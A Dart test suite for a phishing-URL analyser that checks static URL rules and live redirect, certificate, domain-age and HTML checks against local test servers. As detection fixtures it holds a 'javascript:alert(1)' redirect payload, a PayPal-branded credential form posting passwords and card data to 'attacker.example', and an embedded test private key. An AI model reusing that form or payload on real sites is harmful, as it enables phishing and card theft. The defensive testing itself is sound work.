import 'dart:convert';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:prot_keepalive_v0/models/analysis_result.dart';
import 'package:prot_keepalive_v0/services/analysis_service.dart';

void main() {
  group('AnalysisService - validacion y reglas locales', () {
    test('devuelve INVALID cuando la entrada no tiene formato de URL', () async {
      // Test que verifica primera barrera, una entrada que no se trata de una URL:
      final service = AnalysisService(enableLiveChecks: false);

      final result = await service.analyzeUrl('texto sin url');

      expect(result.riskLevel, 'INVALID');
      expect(result.score, 0);
      expect(_ruleIds(result), contains('invalid_input'));
    });

    test('URL sin esquema no debe ser peligrosa por si sola', () async {
      // Informe al usuario de que no se cuenta con HTTP (no suma riesgo),
      final service = AnalysisService(enableLiveChecks: false);

      final result = await service.analyzeUrl('example.com');

      expect(_ruleIds(result), contains('missing_scheme'));
      expect(result.score, 0);
      expect(result.riskLevel, 'LOW_RISK');
    });

    test('activa las reglas estaticas minimas de URL', () async {
      final service = AnalysisService(enableLiveChecks: false);

      final cases = <String, String>{
        'http://example.com': 'insecure_http',
        'https://192.168.1.10/login': 'ip_as_domain',
        'https://login.example.com@attacker.test': 'at_symbol',
        'https://example.com/${List.filled(90, 'a').join()}': 'long_url',
        'https://bit.ly/abc123': 'url_shortener',
        'https://a.b.c.d.example.com': 'many_subdomains',
        'https://example.com/login/payment': 'suspicious_keywords',
        'https://xn--pple-43d.com': 'punycode_domain',
        'https://example.cfd': 'suspicious_tld',
      };

      for (final entry in cases.entries) {
        final result = await service.analyzeUrl(entry.key);

        expect(
          _ruleIds(result),
          contains(entry.value),
          reason: '${entry.key} debe activar ${entry.value}',
        );
      }
    });

    test('activa reglas estructurales de URL sin depender de Internet', () async {
      // Medimos que las heurísticas se disparen correctamente, no saber si la URL es maliciosa
      final service = AnalysisService(enableLiveChecks: false);

      final result = await service.analyzeUrl(
        '192.168.1.10/login?next=javascript:alert(1)',
      );

      final ruleIds = _ruleIds(result);
      expect(ruleIds, contains('missing_scheme'));
      expect(ruleIds, contains('ip_as_domain'));
      expect(ruleIds, contains('suspicious_keywords'));
      expect(ruleIds, contains('redirect'));
      expect(ruleIds, contains('script'));
      expect(result.score, greaterThan(0));
      expect(result.riskLevel, 'POTENTIALLY_MALICIOUS');
    });

    test('detecta dominios Punycode y similitud con marcas conocidas', () async {
      // Punycode y similitud por Levenshtein son dos senales independientes:
      // la primera detecta dominios internacionalizados y la segunda typosquatting.
      final service = AnalysisService(enableLiveChecks: false);

      final punycodeResult = await service.analyzeUrl(
        'https://xn--pple-43d.com',
      );
      final brandResult = await service.analyzeUrl('https://paypa1.com');

      expect(_ruleIds(punycodeResult), contains('punycode_domain'));
      expect(_ruleIds(brandResult), contains('brand_similarity'));
    });

    test('devuelve no_findings cuando no se activa ninguna regla local', () async {
      // Caso de control: una URL sencilla, con HTTPS y sin patrones sospechosos,
      // debe producir una evaluacion sin hallazgos en el modo de reglas locales.
      final service = AnalysisService(enableLiveChecks: false);

      final result = await service.analyzeUrl('https://example.com');

      expect(result.score, 0);
      expect(result.riskLevel, 'LOW_RISK');
      expect(_ruleIds(result), contains('no_findings'));
    });
  });

  group('AnalysisService - analisis activo con servidor local', () {
    test('HTTP final debe penalizar en analisis activo', () async {
      // final_http representa una comprobacion activa: se penaliza cuando el
      // destino realmente resuelto usa HTTP, no solo por ausencia de esquema.
      final server = await _startServer((request) async {
        request.response
          ..headers.contentType = ContentType.html
          ..write('<html><title>HTTP local</title><body>OK</body></html>');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl(server.baseUrl);

      expect(_ruleIds(result), contains('final_http'));
    });

    test('detecta una cadena de redireccion real', () async {
      // Se usa un servidor HTTP local para evitar depender de una web externa.
      // La prueba valida que el codigo sigue una redireccion HTTP controlada.
      final server = await _startServer((request) async {
        if (request.uri.path == '/qr') {
          request.response
            ..statusCode = HttpStatus.found
            ..headers.set(HttpHeaders.locationHeader, '/landing');
          await request.response.close();
          return;
        }

        request.response
          ..headers.contentType = ContentType.html
          ..write('<html><title>Destino</title><body>OK</body></html>');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl('${server.baseUrl}/qr');

      expect(_ruleIds(result), contains('redirect_chain'));
    });

    test('detecta y detiene bucles de redireccion', () async {
      final server = await _startServer((request) async {
        if (request.uri.path == '/a') {
          request.response
            ..statusCode = HttpStatus.found
            ..headers.set(HttpHeaders.locationHeader, '/b');
          await request.response.close();
          return;
        }

        request.response
          ..statusCode = HttpStatus.found
          ..headers.set(HttpHeaders.locationHeader, '/a');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl('${server.baseUrl}/a');

      expect(_ruleIds(result), contains('redirect_loop'));
      expect(_ruleIds(result), isNot(contains('too_many_redirects')));
    });

    test('usa HEAD para resolver redirecciones cuando es compatible', () async {
      final methods = <String>[];
      final server = await _startServer((request) async {
        methods.add('${request.method} ${request.uri.path}');

        if (request.uri.path == '/qr') {
          request.response
            ..statusCode = HttpStatus.found
            ..headers.set(HttpHeaders.locationHeader, '/landing');
          await request.response.close();
          return;
        }

        request.response
          ..headers.contentType = ContentType.html
          ..write('<html><title>Destino</title><body>OK</body></html>');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl('${server.baseUrl}/qr');

      expect(_ruleIds(result), contains('redirect_chain'));
      expect(methods, contains('HEAD /qr'));
      expect(methods, isNot(contains('GET /qr')));
    });

    test('usa GET controlado como fallback cuando HEAD no sirve', () async {
      final methods = <String>[];
      final server = await _startServer((request) async {
        methods.add('${request.method} ${request.uri.path}');

        if (request.uri.path == '/qr' && request.method == 'HEAD') {
          request.response.statusCode = HttpStatus.methodNotAllowed;
          await request.response.close();
          return;
        }

        if (request.uri.path == '/qr') {
          request.response
            ..statusCode = HttpStatus.found
            ..headers.set(HttpHeaders.locationHeader, '/landing');
          await request.response.close();
          return;
        }

        request.response
          ..headers.contentType = ContentType.html
          ..write('<html><title>Destino</title><body>OK</body></html>');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl('${server.baseUrl}/qr');

      expect(_ruleIds(result), contains('redirect_chain'));
      expect(methods, contains('HEAD /qr'));
      expect(methods, contains('GET /qr'));
    });

    test('detecta demasiadas redirecciones', () async {
      // El servidor siempre responde con otra redireccion local. Al superar el
      // limite configurado, el analisis activo debe marcar too_many_redirects.
      final server = await _startServer((request) async {
        final currentStep = int.tryParse(
          request.uri.path.replaceFirst('/step-', ''),
        );
        final nextStep = (currentStep ?? 0) + 1;

        request.response
          ..statusCode = HttpStatus.found
          ..headers.set(HttpHeaders.locationHeader, '/step-$nextStep');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl('${server.baseUrl}/step-0');

      expect(_ruleIds(result), contains('too_many_redirects'));
    });

    test('detecta cambio de dominio final tras redireccion', () async {
      // Usamos dos nombres de host locales distintos para simular que el enlace
      // empieza en un dominio y termina en otro sin depender de Internet.
      final target = await _startServer((request) async {
        request.response
          ..headers.contentType = ContentType.html
          ..write('<html><title>Destino final</title><body>OK</body></html>');
        await request.response.close();
      });
      addTearDown(target.close);

      final redirector = await _startServer((request) async {
        request.response
          ..statusCode = HttpStatus.found
          ..headers.set(HttpHeaders.locationHeader, target.baseUrl);
        await request.response.close();
      });
      addTearDown(redirector.close);

      final service = AnalysisService();
      final initialUrl = redirector.baseUrl.replaceFirst(
        '127.0.0.1',
        'localhost',
      );
      final result = await service.analyzeUrl(initialUrl);

      expect(_ruleIds(result), contains('redirect_domain_change'));
    });

    test('no marca como cambio redirecciones a prefijos web habituales', () {
      expect(
        AnalysisService.hasEquivalentRedirectHostForTesting(
          'amazon.com',
          'www.amazon.com',
        ),
        isTrue,
      );
      expect(
        AnalysisService.hasEquivalentRedirectHostForTesting(
          'example.com',
          'm.example.com',
        ),
        isTrue,
      );
      expect(
        AnalysisService.hasEquivalentRedirectHostForTesting(
          'amazon.com',
          'login.amazon-security.example',
        ),
        isFalse,
      );
    });

    test('detecta URL no alcanzable', () async {
      final port = await _unusedLocalPort();
      final service = AnalysisService();

      final result = await service.analyzeUrl('http://127.0.0.1:$port');

      expect(_ruleIds(result), contains('unreachable_url'));
    });

    test('detecta problema de certificado HTTPS', () async {
      // HTTPS local con certificado autofirmado: el HttpClient por defecto debe
      // rechazarlo y la regla activa debe marcar certificate_problem.
      final server = await _startSecureServer((request) async {
        request.response
          ..headers.contentType = ContentType.html
          ..write('<html><title>HTTPS local</title><body>OK</body></html>');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl(server.baseUrl);

      expect(_ruleIds(result), contains('certificate_problem'));
      expect(result.dynamicHtmlStatus, 'html_unavailable_certificate_problem');
      expect(result.dynamicAnalysisPartial, isTrue);
    });

    test('no hace POST ni reenvia cookies entre peticiones', () async {
      final methods = <String>[];
      final cookieHeaders = <String?>[];
      final server = await _startServer((request) async {
        methods.add(request.method);
        cookieHeaders.add(request.headers.value(HttpHeaders.cookieHeader));

        if (request.uri.path == '/qr') {
          request.response
            ..statusCode = HttpStatus.found
            ..headers.set(HttpHeaders.locationHeader, '/landing')
            ..headers.add(HttpHeaders.setCookieHeader, 'session=phishing');
          await request.response.close();
          return;
        }

        request.response
          ..headers.contentType = ContentType.html
          ..write('<html><title>Destino</title><body>OK</body></html>');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      await service.analyzeUrl('${server.baseUrl}/qr');

      expect(methods, isNot(contains('POST')));
      expect(cookieHeaders.where((value) => value != null), isEmpty);
    });

    test('no analiza contenido que no sea HTML', () async {
      final server = await _startServer((request) async {
        request.response
          ..headers.contentType = ContentType.binary
          ..write('<input type="password" name="password">');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl(server.baseUrl);

      expect(result.dynamicHtmlStatus, 'html_not_html');
      expect(_ruleIds(result), isNot(contains('password_form')));
    });

    test('omite HTML declarado como demasiado grande', () async {
      final body = '${List.filled(31000, 'a').join()}<input type="password">';
      final server = await _startServer((request) async {
        request.response
          ..headers.contentType = ContentType.html
          ..contentLength = utf8.encode(body).length
          ..write(body);
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl(server.baseUrl);

      expect(result.dynamicHtmlStatus, 'html_too_large');
      expect(result.dynamicAnalysisPartial, isTrue);
      expect(_ruleIds(result), isNot(contains('password_form')));
    });

    test('omite HTML que supera el limite real durante la lectura', () async {
      final server = await _startServer((request) async {
        request.response.headers.contentType = ContentType.html;
        request.response.write(List.filled(30001, 'a').join());
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl(server.baseUrl);

      expect(result.dynamicHtmlStatus, 'html_too_large');
      expect(result.dynamicAnalysisPartial, isTrue);
    });

    test('detecta patrones basicos del HTML descargado', () async {
      // Este test comprueba el analisis de contenido HTML en una pagina local:
      // formulario de credenciales, envio externo, iframe oculto y marca en title.
      final server = await _startServer((request) async {
        request.response
          ..headers.contentType = ContentType.html
          ..write('''
            <html>
              <head><title>PayPal - acceso seguro</title></head>
              <body>
                <form action="https://attacker.example/collect">
                  <input id="email" name="email">
                  <input id="password" name="password" type="password">
                  <input id="card" name="card">
                  <input id="cvv" name="cvv">
                </form>
                <iframe style="display:none" src="/hidden"></iframe>
              </body>
            </html>
          ''');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl(server.baseUrl);
      final ruleIds = _ruleIds(result);

      expect(ruleIds, contains('password_form'));
      expect(ruleIds, contains('many_sensitive_inputs'));
      expect(ruleIds, contains('external_form_action'));
      expect(ruleIds, contains('hidden_iframe'));
      expect(ruleIds, contains('title_brand_mismatch'));
    });

    test('formulario al mismo dominio no marca external_form_action', () async {
      // El envio relativo /login pertenece al mismo dominio del recurso
      // analizado, por lo que no debe activar la regla de formulario externo.
      final server = await _startServer((request) async {
        request.response
          ..headers.contentType = ContentType.html
          ..write('''
              <html>
                <body>
                  <form action="/login">
                    <input name="email">
                    <input name="password" type="password">
                  </form>
                </body>
              </html>
            ''');
        await request.response.close();
      });
      addTearDown(server.close);

      final service = AnalysisService();
      final result = await service.analyzeUrl(server.baseUrl);
      final ruleIds = _ruleIds(result);

      expect(ruleIds, contains('password_form'));
      expect(ruleIds, isNot(contains('external_form_action')));
    });

    test(
      'interpreta una respuesta RDAP de dominio creado recientemente',
      () async {
        // RDAP se simula con un servidor local. Asi se valida el parseo de la
        // fecha de registro sin consultar servicios externos durante las pruebas.
        final registrationDate = DateTime.now()
            .subtract(const Duration(days: 10))
            .toUtc()
            .toIso8601String();

        final server = await _startServer((request) async {
          request.response
            ..headers.contentType = ContentType.json
            ..write(
              jsonEncode({
                'events': [
                  {
                    'eventAction': 'registration',
                    'eventDate': registrationDate,
                  },
                ],
              }),
            );
          await request.response.close();
        });
        addTearDown(server.close);

        final service = AnalysisService(rdapBaseUri: Uri.parse(server.baseUrl));
        final findings = await service.checkDomainAgeForTesting('example.com');

        expect(
          findings.map((finding) => finding.ruleId),
          contains('very_new_domain'),
        );
      },
    );
  });
}

List<String> _ruleIds(AnalysisResult result) {
  return result.findings.map((finding) => finding.ruleId).toList();
}

Future<_LocalTestServer> _startServer(
  Future<void> Function(HttpRequest request) handler,
) async {
  final server = await HttpServer.bind(InternetAddress.loopbackIPv4, 0);
  final subscription = server.listen(handler);
  final baseUrl = 'http://${server.address.host}:${server.port}';

  return _LocalTestServer(
    baseUrl: baseUrl,
    close: () async {
      await subscription.cancel();
      await server.close(force: true);
    },
  );
}

Future<_LocalTestServer> _startSecureServer(
  Future<void> Function(HttpRequest request) handler,
) async {
  final context = SecurityContext()
    ..useCertificateChainBytes(utf8.encode(_localhostCertificatePem))
    ..usePrivateKeyBytes(utf8.encode(_localhostPrivateKeyPem));
  final server = await HttpServer.bindSecure(
    InternetAddress.loopbackIPv4,
    0,
    context,
  );
  final subscription = server.listen(handler);
  final baseUrl = 'https://${server.address.host}:${server.port}';

  return _LocalTestServer(
    baseUrl: baseUrl,
    close: () async {
      await subscription.cancel();
      await server.close(force: true);
    },
  );
}

Future<int> _unusedLocalPort() async {
  final server = await HttpServer.bind(InternetAddress.loopbackIPv4, 0);
  final port = server.port;
  await server.close(force: true);
  return port;
}

class _LocalTestServer {
  final String baseUrl;
  final Future<void> Function() close;

  const _LocalTestServer({required this.baseUrl, required this.close});
}

const _localhostCertificatePem = '''
-----BEGIN CERTIFICATE-----
MIIDCTCCAfGgAwIBAgIUGDxglejnnH2nr8XeCVV9B8SJ/Z0wDQYJKoZIhvcNAQEL
BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTI2MDUyNDEzMzUyOFoXDTI2MDUy
NTEzMzUyOFowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
AAOCAQ8AMIIBCgKCAQEA2AiW2a5SyHyvGsCQP3M+fmHlNSljfcrpsknG7C2D/dUq
anZwThlN/ZVkh+cEmdpTKRK4fkJsF5OI0gatVGoWriRoPt3OEkflbcbnmAcOFHum
q9Ox7sAYRyGZoUyLwaSnOV/vKofH63HRtpzQUnwyykqd1FQUcPtJM/rlur6+fBgo
oNxaAP+zTwZWjzKVQrW07GUQoxRW/ooepy64WibXlBl0/QfxzwBDO1z+h1JtJYf1
sWiKF37h6uU4k/ADpsCW6+4DoJ9P/AbPNlVefoI6BWrlWJmnvE5QrWI1491T2wS0
5SNYEOCyQY//SM/5pAawr3hFK8Uq12BzV1VmXnibUQIDAQABo1MwUTAdBgNVHQ4E
FgQUDN/lN1cIGb6Ra5BKtsj9Mm6V5mYwHwYDVR0jBBgwFoAUDN/lN1cIGb6Ra5BK
tsj9Mm6V5mYwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAjp9T
T4viAPlrwwtoz7s5LcSQ6Aq8C41sjJ37714qyF/suBRCj+0b0u3N6RiSf9gdndxZ
sJl3+sr9Uj22P2sb+aII8IXLJw5chKKg9kgoOYwgwTPkRGRMvCOdCq4IFo5JghWC
NuaJiWNwRiL1mbRbVgmtGRnNqSp8qnh3Ab1QkoDF2zz87z9DPBGmdVcQfmEOnNyG
JHOHTh6mWnLgPgBZME5x4bW+0XLFpbze1BydbPYKOB/Vrjsu3A9sYax6kHluHuh1
y0nO5qBliCS4G/G1ympyb4/lfQKOJ+zB3seyEPDVzuXjsit+ZPHlDw8CWpn5apBW
wRG+8AMX0lUIjN/ZbA==
-----END CERTIFICATE-----
''';

const _localhostPrivateKeyPem = '''
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDYCJbZrlLIfK8a
wJA/cz5+YeU1KWN9yumyScbsLYP91SpqdnBOGU39lWSH5wSZ2lMpErh+QmwXk4jS
Bq1UahauJGg+3c4SR+VtxueYBw4Ue6ar07HuwBhHIZmhTIvBpKc5X+8qh8frcdG2
nNBSfDLKSp3UVBRw+0kz+uW6vr58GCig3FoA/7NPBlaPMpVCtbTsZRCjFFb+ih6n
LrhaJteUGXT9B/HPAEM7XP6HUm0lh/WxaIoXfuHq5TiT8AOmwJbr7gOgn0/8Bs82
VV5+gjoFauVYmae8TlCtYjXj3VPbBLTlI1gQ4LJBj/9Iz/mkBrCveEUrxSrXYHNX
VWZeeJtRAgMBAAECggEAAW0GDBs0mxJ5hltwIokn82YTdCxfcMbKKa8rIsnZzHQj
plSPEvYrJ8Vm0N03e+rhEDItb6NsRkJIOmvuI/udCKENXiFWQDgodncGqWpMGwN2
4MxBdeoxYqtIvp9med1HycGOqa3CoOvrUTsUsgng8BnU25ImqGNyIFMQVW1d/ZzM
QZYlEtuQKxU3ZlCTF7ww7A/g8E+Ejbdu+DP4cMkLBzVuWigthzJuIJRLJFpxzHqP
O8AyBA2Yjs29567AlvjvcY9VeQnueJ0SLdLTwDp3soigAYIJhpQmnNyq5u2wdB5e
JbUTZAAhvAVqDlgV+ORepuczncXs3kQ+s1tIqCd8eQKBgQD8Lw7k1jcnIFGRcYTQ
mmlV/3c7RniKMgFVUS95NI46p63ts620U80FozSod4HN8yasnnGWHdZmzjyrFfff
L2Sm6+JwS0h2TgznuphTEVM8K+8HfcyBSgmuSd0/PnU6UpdIdc1y957lKEzztma2
1RZMGMpimydHi3I/0lA7T3T1jwKBgQDbTXzQwa1U+TDEiorkt36AAzqCiUUSSFoT
dU37IwN9GZm2yB2WPwxLxNcEw7ziHlR7pTkjjY9nmwl6CsQjKVRyhjCavEpnfWLT
032dt29U2N3urbPS5RWT0n+QSUzQu9UktWTeix9xWKQnUVI0pCwtPswFZyD8/JUj
nEa8CImxHwKBgQDqXSlwTgyPlh94FZGi8/206Gf8dG+Nrw9CJOMDt23+4NppMDTc
g4zkElrbvcSqi7CDd/SD2FLq0/vZ296yUi8uWcXlKnG7UKn5qZXqjQ1XvFS2F5k5
Bn+ctBSjs/3qJ9tkgeZfU/UdbqilTfyDKeFA80ETBrIocVXKLkBV/m/pzQKBgQCy
0eFn27V5p2Pjr1CIJTOKMJfCHypqOQLyAOHgWPGcTYawq0as36YoFk55/R2Eh9S9
qcEIw4JeqeW1VRgPz8CjTdZOJiDJeE1gioBQXWXzmo6E87DA07mferI3tf1j6vVm
5F5mtKyj4PKheMb+U6wODLmR4kDc6Ry3F9P5uUCFYwKBgQDSw930Kf8J82kUJFZ4
GHVp7u9hY450yCjzEw+gPrP/QhbKTmz2YFcz/5iBLQJMQMhKKZt2C2i/iAtOLJFo
DlDKLNcD89XPCU7Uu3rdn21dIefogb2/wMQLX4raimm9hlcbf6PbjhD984TwiP5X
zf1rIrKC5pB4NQR3584SB3eykQ==
-----END PRIVATE KEY-----
''';
